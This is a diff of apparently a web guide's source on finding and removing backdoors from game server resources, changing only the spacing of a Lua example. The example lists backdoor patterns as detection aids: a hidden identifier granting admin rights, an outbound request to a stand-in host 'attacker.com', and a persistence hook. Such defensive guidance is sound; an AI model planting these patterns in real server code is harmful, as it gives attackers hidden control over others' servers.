@@ -189,7 +189,7 @@ Once you've identified a backdoor, thorough removal is critical because backdoor
       title: "Identify All Backdoor Components",
       description:
         "Don't just remove one suspicious resource or file. Backdoors are typically multi-layered. A single malicious resource might create database accounts, add hidden admin users, and place files in multiple locations. Finding one component should trigger a comprehensive search for others.",
-      code: "-- Common backdoor patterns to search for:\n-- Hidden identifiers that grant permissions\nif identifier == 'hidden-admin-identifier' then\n  grantAdmin(source)\nend\n\n-- External communication\nHttpsRequest({url = 'http://attacker.com/...'})\n\n-- Resource restart immunity\nAddEventHandler('onServerResourceStart', function()\n  -- Persistence code\nend)",
+      code: "-- Common backdoor patterns to search for:\n\n-- Hidden identifiers that grant permissions\n\nif identifier == 'hidden-admin-identifier' then\n\ngrantAdmin(source)\nend\n\n\n-- External communication\n\nHttpsRequest({url = 'http://attacker.com/...'})\n\n\n-- Resource restart immunity\n\nAddEventHandler('onServerResourceStart', function()\n\n  -- Persistence code\nend)",
     },
     {
       title: "Remove the Backdoor",
